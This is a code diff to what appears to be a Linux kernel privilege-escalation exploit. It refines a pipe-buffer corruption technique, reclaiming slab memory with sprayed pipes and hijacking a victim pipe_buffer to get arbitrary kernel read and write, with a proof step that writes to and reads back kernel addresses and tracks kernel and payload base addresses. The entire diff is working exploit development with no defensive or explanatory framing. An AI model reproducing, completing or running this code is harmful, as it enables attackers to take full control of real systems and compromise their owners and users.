@@ -207,6 +207,8 @@ static int g_reclaim_pipes[OSS_PIPE_COUNT][2];
 static pid_t g_holder_pid = -1;
 static uint64_t g_pipe_page_base;
 static uint64_t g_victim_addr;
+static struct oss_pipe_buffer g_victim_saved;
+static int g_victim_saved_valid;
 static uint64_t g_kernel_base;
 static uint64_t g_payload_base;
 static int g_victim_pipe = -1;
@@ -1263,10 +1265,19 @@ static int try_pipe_slab_candidates(int fd, uint64_t slab_base,
               slab_index, (unsigned long long)off, slot, index, ring_reason);
       continue;
     }
+    if (!oss_kernel_write_plan_supported(victim, sizeof(after))) {
+      fprintf(stderr,
+              "[pipe_rw] candidate reject slab=%zu off=%04llx pipe=%d "
+              "reason=configfs-write-plan errno=%d\n",
+              slab_index, (unsigned long long)off, index, errno);
+      continue;
+    }
     proofs++;
     g_pipe_page_base = slab_base;
     g_victim_addr = victim;
     g_victim_pipe = index;
+    g_victim_saved = after;
+    g_victim_saved_valid = 1;
     fprintf(stderr,
             "[pipe_rw] candidate test slab=%zu/%016llx off=%04llx "
             "victim=%016llx ring=head:1,tail:0,slot:%zu pipe=%d len=%u "
@@ -1302,6 +1313,8 @@ static int try_pipe_slab_candidates(int fd, uint64_t slab_base,
     }
     g_victim_addr = 0;
     g_victim_pipe = -1;
+    memset(&g_victim_saved, 0, sizeof(g_victim_saved));
+    g_victim_saved_valid = 0;
   }
   fprintf(stderr,
           "[pipe_rw] selection slab=%zu base=%016llx candidates=%zu "
@@ -1359,14 +1372,13 @@ static int pipe_io_bounded(int fd, void *buffer, size_t length, int writing) {
 }
 
 static int pipe_rw_read_once(int fd, uint64_t addr, void *buf, size_t len) {
-  if (!g_victim_addr || g_victim_pipe < 0 || !is_direct_ptr(addr) || !len ||
+  if (!g_victim_addr || g_victim_pipe < 0 || !g_victim_saved_valid ||
+      !is_direct_ptr(addr) || !len ||
       (addr & OSS_PAGE_MASK) + len > OSS_PAGE_SIZE) {
+    errno = ENODATA;
     return 0;
   }
-  struct oss_pipe_buffer saved;
-  if (!oss_kernel_read(fd, g_victim_addr, &saved, sizeof(saved))) {
-    return 0;
-  }
+  struct oss_pipe_buffer saved = g_victim_saved;
   int saved_flags;
   int pipe_fd = g_reclaim_pipes[g_victim_pipe][0];
   if (!fd_set_nonblock(pipe_fd, &saved_flags)) {
@@ -1400,14 +1412,13 @@ static int pipe_rw_read_once(int fd, uint64_t addr, void *buf, size_t len) {
 
 static int pipe_rw_write_once(int fd, uint64_t addr, const void *buf,
                               size_t len) {
-  if (!g_victim_addr || g_victim_pipe < 0 || !is_direct_ptr(addr) || !len ||
+  if (!g_victim_addr || g_victim_pipe < 0 || !g_victim_saved_valid ||
+      !is_direct_ptr(addr) || !len ||
       (addr & OSS_PAGE_MASK) + len > OSS_PAGE_SIZE) {
+    errno = ENODATA;
     return 0;
   }
-  struct oss_pipe_buffer saved;
-  if (!oss_kernel_read(fd, g_victim_addr, &saved, sizeof(saved))) {
-    return 0;
-  }
+  struct oss_pipe_buffer saved = g_victim_saved;
   int saved_flags;
   int pipe_fd = g_reclaim_pipes[g_victim_pipe][1];
   if (!fd_set_nonblock(pipe_fd, &saved_flags)) {
@@ -1478,8 +1489,8 @@ static int prove_pipe_rw(int fd, enum pipe_error *error) {
   }
   memset(string_readback, 0, sizeof(string_readback));
   errno = 0;
-  if (!oss_kernel_read(fd, proof_addr, string_readback,
-                       sizeof(string_readback)) ||
+  if (!pipe_rw_read_once(fd, proof_addr, string_readback,
+                         sizeof(string_readback)) ||
       memcmp(string_readback, write_string, sizeof(write_string)) != 0) {
     uint64_t got = 0, want = 0;
     memcpy(&got, string_readback, sizeof(got));
@@ -1513,7 +1524,7 @@ static int prove_pipe_rw(int fd, enum pipe_error *error) {
   readback = 0;
   errno = 0;
   if (!pipe_rw_write_once(fd, proof_addr, &write_tag, sizeof(write_tag)) ||
-      !oss_kernel_read(fd, proof_addr, &readback, sizeof(readback)) ||
+      !pipe_rw_read_once(fd, proof_addr, &readback, sizeof(readback)) ||
       readback != write_tag) {
     fprintf(stderr,
             "[pipe_rw] proof miss step=write-u64 errno=%d got=%016llx "
@@ -1743,6 +1754,13 @@ static int resolve_pipe_victim_deterministic(int fd,
         candidate.len != (uint32_t)(i + 1)) {
       continue;
     }
+    if (!oss_kernel_write_plan_supported(victim, sizeof(candidate))) {
+      fprintf(stderr,
+              "[pipe_rw] det: pipe=%zu victim=%016llx rejected "
+              "reason=configfs-write-plan errno=%d\n",
+              i, (unsigned long long)victim, errno);
+      continue;
+    }
     uint64_t slab_base = victim & ~(OSS_ORDER3_SIZE - 1);
     if (!is_direct_ptr(slab_base)) {
       continue;
@@ -1750,6 +1768,8 @@ static int resolve_pipe_victim_deterministic(int fd,
     g_pipe_page_base = slab_base;
     g_victim_addr = victim;
     g_victim_pipe = (int)i;
+    g_victim_saved = candidate;
+    g_victim_saved_valid = 1;
     fprintf(stderr,
             "[pipe_rw] det: pipe=%zu victim=%016llx bufs=%016llx tail=%u "
             "ring=%u len=%u slab=%016llx\n",
@@ -1793,6 +1813,8 @@ void oss_pipe_rw_reset(void) {
   close_pipe_bank(g_reclaim_pipes);
   g_pipe_page_base = 0;
   g_victim_addr = 0;
+  memset(&g_victim_saved, 0, sizeof(g_victim_saved));
+  g_victim_saved_valid = 0;
   g_kernel_base = 0;
   g_payload_base = 0;
   g_victim_pipe = -1;
